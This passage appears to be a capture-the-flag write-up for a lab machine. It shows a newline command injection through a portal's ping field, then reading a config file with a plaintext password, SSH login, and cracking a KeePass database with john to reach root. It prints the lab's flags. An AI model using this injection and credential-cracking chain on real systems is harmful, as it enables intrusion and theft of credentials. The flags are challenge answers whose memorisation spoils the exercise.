    <span>Portal</span><span class="sep">/</span><span>Dashboard</span><span class="sep">/</span><span class="cur">Host Health</span>
  </div>
  <div class="topbar-right">
    <div class="user-chip">
      <div class="user-avatar"><svg viewBox="0 0 16 16"><path d="M8 8a3 3 0 100-6 3 3 0 000 6zm-5 5a5 5 0 0110 0H3z"/></svg></div>
      <span class="user-name">netops</span>
      <span class="user-role">operator</span>
    </div>
    <a href="/internal/logout" class="btn-out">
      <svg viewBox="0 0 16 16"><path d="M10 3h3v10h-3v-2H8v-1h2V6H8V5h2V3zM1 5h6v1H3v4h4v1H1V5z"/></svg>Sign Out
    </a>
  </div>
</header>

<div class="layout">
  <nav class="sidebar">
    <div class="sidebar-inner">
      <div class="nav-grp">
        <div class="nav-grp-lbl">Operations</div>
        <a href="/internal/dashboard" class="nav-a">
          <svg viewBox="0 0 16 16"><path d="M1 1h6v6H1zM9 1h6v6H9zM1 9h6v6H1zM9 9h6v6H9z"/></svg>Overview
        </a>
        <a href="/internal/health" class="nav-a active">
          <svg viewBox="0 0 16 16"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm0 2a5 5 0 110 10A5 5 0 018 3zm-.5 2v4l3 1.5-.5.9L7 9.5V5h.5z"/></svg>Host Health
          <span class="nav-badge">3</span>
        </a>
      </div>
      <div class="nav-div"></div>
      <div class="nav-grp">
        <div class="nav-grp-lbl">Monitoring</div>
        <a href="/internal/dashboard#audit" class="nav-a">
          <svg viewBox="0 0 16 16"><path d="M1 2h14v1H1zM1 5h10v1H1zM1 8h14v1H1zM1 11h10v1H1zM1 14h14v1H1z"/></svg>Audit Log
        </a>
        <a href="/internal/dashboard#services" class="nav-a">
          <svg viewBox="0 0 16 16"><path d="M2 4h12v8H2V4zm1 1v6h10V5H3z"/></svg>Services
        </a>
      </div>
      <div class="nav-div"></div>
      <div class="nav-grp">
        <div class="nav-grp-lbl">Account</div>
        <a href="/internal/logout" class="nav-a">
          <svg viewBox="0 0 16 16"><path d="M10 3h3v10h-3v-2H8v-1h2V6H8V5h2V3zM1 5h6v1H3v4h4v1H1V5z"/></svg>Sign Out
        </a>
      </div>
    </div>
    <div class="sidebar-foot">NOC Portal v2.4.1</div>
  </nav>

  <main class="main">
    <div class="page-hdr">
      <h2>Host Health Check</h2>
      <p>ICMP reachability probe &mdash; verify connectivity to a target host or IP address</p>
    </div>

    <div class="panel">
      <div class="ph"><div class="ph-l"><svg viewBox="0 0 16 16"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm0 2a5 5 0 110 10A5 5 0 018 3zm-.5 2v4l3 1.5-.5.9L7 9.5V5h.5z"/></svg><span class="ph-t">Connectivity Probe</span></div></div>
      <div class="panel-body">
        <div class="preset-row">
          <span class="preset-lbl">Quick:</span>
          <button class="preset-btn" onclick="setTarget('127.0.0.1')">127.0.0.1</button>
          <button class="preset-btn" onclick="setTarget('10.0.0.1')">10.0.0.1</button>
          <button class="preset-btn" onclick="setTarget('10.0.1.1')">10.0.1.1</button>
          <button class="preset-btn" onclick="setTarget('10.0.2.1')">10.0.2.1</button>
          <button class="preset-btn" onclick="setTarget('10.0.10.1')">10.0.10.1</button>
        </div>
        <form method="POST" action="/internal/health">
          <div class="probe-form">
            <div class="field">
              <label class="field-lbl" for="target">Target Hostname or IP Address</label>
              <div class="input-wrap">
                <input type="text" id="target" name="target"
                       placeholder="hostname or x.x.x.x"
                       value="0.0.0.0
whoami"
                       autocomplete="off" spellcheck="false">
                <svg viewBox="0 0 16 16"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm0 2a5 5 0 110 10A5 5 0 018 3z"/></svg>
              </div>
              <div class="field-hint">IPv4 (e.g. 192.168.1.1) or hostname (e.g. server-01.corp.internal)</div>
            </div>
            <button type="submit" class="btn-run">
              <svg viewBox="0 0 16 16"><path d="M3 2l11 6-11 6V2z"/></svg>Run Probe
            </button>
          </div>
        </form>
        
        
        <div class="output-block">
          <div class="output-bar">
            <span class="cmd">$ ping -c 2 -W 1 0.0.0.0
whoami</span>
            <span class="lbl">stdout</span>
          </div>
          <pre class="output-pre">PING 0.0.0.0 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.027 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.042 ms

--- 0.0.0.0 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1036ms
rtt min/avg/max/mdev = 0.027/0.034/0.042/0.007 ms
www-data
</pre>
        </div>
        
      </div>
    </div>

    <div class="panel">
      <div class="ph"><div class="ph-l"><svg viewBox="0 0 16 16"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zM7 4h2v5H7V4zm0 6h2v2H7v-2z"/></svg><span class="ph-t">Usage Notes</span></div></div>
      <div class="notes-list">
        <div class="note-row">Sends 2 ICMP echo requests with a 1-second per-packet timeout</div>
        <div class="note-row">Accepts RFC-952 compliant hostnames and dotted-decimal IPv4 addresses</div>
        <div class="note-row">All probe targets are recorded in the operator audit log</div>
        <div class="note-row">ICMP traffic may be filtered by host-based firewalls on monitored nodes</div>
      </div>
    </div>
  </main>
</div>

<script>
function setTarget(v) { document.getElementById("target").value = v; }
</script>
</body>
</html>
```

Discover and read `secret.config` to obtain `username=sysadmin&password=S3cur3Backup$Acc3ss!`. The following is extracted from the `html` responses. 

```bash
www-data:~$ ls -l /opt/netops
total 36
-rw-r--r-- 1 root     root      7283 May 19 19:14 app.py
-rw-rw---- 1 www-data www-data 20480 Nov 11 09:25 netops.db
-rw-r----- 1 root     www-data   446 May 19 03:10 secret.config
drwxr-x--- 2 root     www-data  4096 May 19 03:10 templates
www-data:~$ cat /opt/netops/secret.config
# netops application config
# generated: 2026-01-03

[database]
path    = /opt/netops/netops.db
timeout = 5

[app]
host     = 0.0.0.0
port     = 5050
log_path = /var/log/netops/app.log

[auth]
session_lifetime = 1800

# service account used by the backup agent
# TODO: migrate to secrets manager before Q2 audit
[backup_agent]
run_as   = sysadmin
password = S3cur3Backup$Acc3ss!

[smtp]
host = 127.0.0.1
port = 25
from = noc-alerts@corp.internal
```

Connect to the `SSH` service running on port `22` using these credentials.

```bash
root@ip-ATTACKER_IP:~# ssh sysadmin@TARGET_IP   
The authenticity of host 'TARGET_IP (TARGET_IP)' can't be established.
ED25519 key fingerprint is SHA256:mBtRlOiIk68jScmMRAikuHQ6lDotycO+zrqvQ5V5e70.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'TARGET_IP' (ED25519) to the list of known hosts.
sysadmin@TARGET_IP's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1017-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of 

  System load:  0.08               Processes:             105
  Usage of /:   26.1% of 19.31GB   Users logged in:       0
  Memory usage: 61%                IPv4 address for ens5: TARGET_IP
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

213 updates can be applied immediately.
152 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: 
sysadmin@tryhackme-2204:~$ whoami
sysadmin
sysadmin@tryhackme-2204:~$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
sysadmin@tryhackme-2204:~$ ls -l
total 8
drwx------ 2 sysadmin sysadmin 4096 May 19 03:36 backups
-rw-rw-r-- 1 sysadmin sysadmin   42 May 19 03:29 user.txt
sysadmin@tryhackme-2204:~$ cat user.txt 
THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}
```

The captured flag is **THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}**.

### What is the content of root.txt?

Inspect `/backups/README.txt` to discover a `KeePass` credential database worth retrieving. 

```bash
sysadmin@tryhackme-2204:~$ ls -l backups/
total 8
-rw-r--r-- 1 sysadmin sysadmin  286 May 19 03:36 README.txt
-rw------- 1 sysadmin sysadmin 2439 May 19 03:34 infrastructure.kdbx
sysadmin@tryhackme-2204:~$ cat backups/README.txt 
Backup archive — infrastructure credentials

Periodic exports from the credential store are placed here by the backup agent.
Treat all files in this directory as CONFIDENTIAL.

infrastructure.kdbx — KeePass credential database

Contact the sysadmin team lead if you require access.
```

Download the database, crack it, and discover `username=root&password=S3cur3P4ss0nK33p4ss`.

```bash
root@ip-ATTACKER_IP:~# scp sysadmin@TARGET_IP:/home/sysadmin/backups/infrastructure.kdbx /root/
sysadmin@TARGET_IP's password: 
infrastructure.kdbx                                                     100% 2439     1.7MB/s   00:00    
root@ip-ATTACKER_IP:~# keepass2john infrastructure.kdbx > keepass.hash
root@ip-ATTACKER_IP:~# john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [AES/Argon2 256/256 AVX2])
Cost 1 (t (rounds)) is 15000 for all loaded hashes
Cost 2 (m) is 0 for all loaded hashes
Cost 3 (p) is 0 for all loaded hashes
Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 3 for all loaded hashes
Will run 2 OpenMP threads
Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
spring           (infrastructure)     
1g 0:00:00:00 DONE () 1.124g/s 2838p/s 2838c/s 2838C/s spring..malcolm
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@ip-ATTACKER_IP:~# echo spring | keepassxc-cli ls infrastructure.kdbx 
Enter password to unlock infrastructure.kdbx: 
Root User Password - Sensitive
General/
Windows/
Network/
Internet/
eMail/
Homebanking/
Recycle Bin/
root@ip-ATTACKER_IP:~# echo spring | keepassxc-cli show -s infrastructure.kdbx 'Root User Password - Sensitive'
Enter password to unlock infrastructure.kdbx: 
Title: Root User Password - Sensitive
UserName: root
Password: S3cur3P4ss0nK33p4ss
URL: https://keepass.info/
Notes: root user password, remember to change later.
Uuid: {ab5192bf-d112-1141-853c-3c99d69d5cae}
Tags: 
```

Return to the `SSH` session, elevate to `root`, and capture the flag.

```bash
sysadmin@tryhackme-2204:~$ su root
Password: 
root@tryhackme-2204:/home/sysadmin# cd
root@tryhackme-2204:~# whoami
root
root@tryhackme-2204:~# id
uid=0(root) gid=0(root) groups=0(root)
root@tryhackme-2204:~# ls -l
total 8
-rw-r--r-- 1 root root   38 May 19 03:28 root.txt
drwxr-xr-x 4 root root 4096 Oct 22  2024 snap
root@tryhackme-2204:~# cat root.txt 
THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}
```

The captured flag is **THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}**.